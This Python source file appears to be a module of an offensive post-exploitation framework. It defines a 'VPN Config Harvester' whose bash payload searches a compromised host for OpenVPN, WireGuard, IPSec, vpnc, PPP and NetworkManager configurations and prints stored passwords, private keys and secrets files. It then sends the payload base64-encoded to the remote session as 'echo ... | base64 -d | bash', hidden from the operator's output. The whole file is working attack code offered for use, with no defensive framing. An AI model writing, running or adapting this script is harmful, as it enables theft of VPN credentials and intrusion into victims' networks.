"""VPN configuration harvesting script."""

from ..base import OperatorScript, ScriptResult


class VPNConfigHarvest(OperatorScript):
    """Harvest VPN configurations and credentials for network pivoting."""
    
    name = "VPN Config Harvester"
    description = "Harvest VPN configurations and credentials"
    category = "lateral"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] VPN CONFIGURATION HARVESTER"
echo "==============================="
echo ""

echo "[+] Searching for OpenVPN configs:"
find / -name "*.ovpn" 2>/dev/null | while read file; do
    echo "[!] Found: $file"
    ls -la "$file"
    echo "Content preview:"
    grep -E "remote |auth-user-pass|cert |key " "$file" 2>/dev/null
    echo ""
done

echo "[+] OpenVPN credential files:"
find / -name "*vpn*auth*" -o -name "*.ovpn.pass" 2>/dev/null | while read file; do
    echo "[!] Credentials: $file"
    cat "$file" 2>/dev/null
    echo ""
done

echo "[+] NetworkManager VPN configs:"
if [ -d /etc/NetworkManager/system-connections ]; then
    ls -la /etc/NetworkManager/system-connections/ 2>/dev/null
    find /etc/NetworkManager/system-connections -type f -exec grep -H "vpn\|password\|username" {} \; 2>/dev/null
fi
echo ""

echo "[+] WireGuard configurations:"
find / -name "wg*.conf" 2>/dev/null | while read file; do
    echo "[!] Found: $file"
    cat "$file" 2>/dev/null | grep -E "PrivateKey|Endpoint|PublicKey"
    echo ""
done

echo "[+] IPSec/strongSwan configs:"
for conf in /etc/ipsec.conf /etc/ipsec.secrets /etc/strongswan/ipsec.conf; do
    if [ -f "$conf" ]; then
        echo "[!] Found: $conf"
        cat "$conf" 2>/dev/null | grep -v "^#" | grep -v "^$" | head -20
        echo ""
    fi
done

echo "[+] Cisco VPN (vpnc) configs:"
find / -name "vpnc*.conf" 2>/dev/null | while read file; do
    echo "[!] Found: $file"
    cat "$file" 2>/dev/null
    echo ""
done

echo "[+] L2TP/PPP configs:"
for conf in /etc/ppp/chap-secrets /etc/ppp/pap-secrets /etc/xl2tpd/xl2tpd.conf; do
    if [ -f "$conf" ]; then
        echo "[!] Found: $conf"
        cat "$conf" 2>/dev/null | grep -v "^#"
        echo ""
    fi
done

echo "[+] SSH tunnels in systemd:"
systemctl list-unit-files | grep -i ssh\|tunnel 2>/dev/null

echo "[+] Active VPN connections:"
ip addr show | grep -E "tun|tap|vpn|wg"
echo ""

echo "[+] VPN processes:"
ps aux | grep -E "openvpn|wireguard|ipsec|vpnc|xl2tpd|pppd" | grep -v grep
echo ""

echo "[+] Routing table (VPN routes):"
ip route show | grep -E "tun|tap|vpn|wg"
echo ""

echo "[+] User VPN configs in home directories:"
find /home -name ".openvpn" -o -name ".vpn" 2>/dev/null
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Harvesting VPN configurations...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="VPN config harvesting executed",
                metadata={"script": "vpn_config_harvest"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
